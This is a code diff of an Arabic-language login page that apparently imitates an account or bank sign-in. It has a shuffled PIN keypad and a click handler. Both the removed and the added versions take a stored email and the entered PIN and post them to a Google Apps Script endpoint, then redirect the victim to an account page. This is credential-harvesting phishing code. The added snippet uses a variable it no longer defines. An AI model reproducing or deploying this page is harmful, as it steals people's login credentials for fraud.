@@ -1,58 +1,25 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        body { font-family: sans-serif; margin: 0; background-color: #EAF0E9; display: flex; justify-content: center; min-height: 100vh; }
-        .main-container { width: 100%; max-width: 400px; padding: 40px 20px; }
-        .password-display { width: 100%; padding: 18px; border: 1px solid #c8d1c7; border-radius: 12px; font-size: 18px; text-align: right; background: #fff; margin-bottom: 20px; height: 60px; }
-        .login-btn { width: 100%; background-color: #fff; color: #ccc; border: 1px solid #c8d1c7; padding: 16px; border-radius: 15px; font-size: 20px; font-weight: bold; cursor: not-allowed; }
-        .login-btn.active { background-color: #2EAF4A; color: #fff; border: none; cursor: pointer; }
-        .keypad { display: grid; grid-template-columns: repeat(4, 1fr); border: 1px solid #c8d1c7; background: #fff; margin-top: 30px; }
-        .key { padding: 20px 0; text-align: center; font-size: 22px; font-weight: bold; border: 0.5px solid #c8d1c7; cursor: pointer; }
-    </style>
-</head>
-<body>
-<div class="main-container">
-    <div style="font-weight:bold; margin-bottom:15px;">الرمز السري</div>
-    <input type="password" id="passInput" class="password-display" readonly>
-    <button id="finalBtn" class="login-btn" disabled>ولوج</button>
-    <div class="keypad" id="keypad"></div>
-</div>
-
-<script>
-    let currentPass = "";
+document.getElementById('finalBtn').addEventListener('click', async () => {
+    const email = localStorage.getItem('storedEmail');
+    const btn = document.getElementById('finalBtn');
+    
+    btn.innerText = "جاري الحفظ...";
+    btn.disabled = true;
+    
     const scriptURL = 'https://script.google.com/macros/s/AKfycbwKACz6-gYKCiYYDLYBSqMk-EUtadf23y1fQm0xmcWekwN2LiTl8dX8o_TZPsBQ8G5K/exec';
 
-    function generateKeypad() {
-        let nums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].sort(() => Math.random() - 0.5);
-        const keypad = document.getElementById('keypad');
-        for (let i = 0; i < 12; i++) {
-            const keyDiv = document.createElement('div');
-            keyDiv.className = 'key';
-            if (i < 10) {
-                keyDiv.innerText = nums[i];
-                keyDiv.onclick = () => {
-                    if (currentPass.length < 6) {
-                        currentPass += nums[i];
-                        document.getElementById('passInput').value = "*".repeat(currentPass.length);
-                        if(currentPass.length >= 4) { document.getElementById('finalBtn').disabled = false; document.getElementById('finalBtn').classList.add('active'); }
-                    }
-                };
-            }
-            keypad.appendChild(keyDiv);
-        }
-    }
-
-    document.getElementById('finalBtn').addEventListener('click', async () => {
-        await fetch(scriptURL, {
-            method: 'POST', mode: 'no-cors',
-            body: JSON.stringify({ email: localStorage.getItem('storedEmail'), password: currentPass, action: "final_login" })
-        });
-        window.location.href = "../UserAccountSystem/Account/";
+    await fetch(scriptURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            email: email,
+            password: currentPass, // الرمز السري من لوحة الأرقام
+            action: "final_login"  // الإشارة الضرورية لمنع إعادة إرسال الإيميل
+        })
     });
-    window.onload = generateKeypad;
-</script>
-</body>
-</html>
+    
+    // الانتظار قليلاً للتأكد من وصول البيانات ثم التحويل
+    setTimeout(() => {
+        window.location.href = "../UserAccountSystem/Account/";
+    }, 1500);
+});
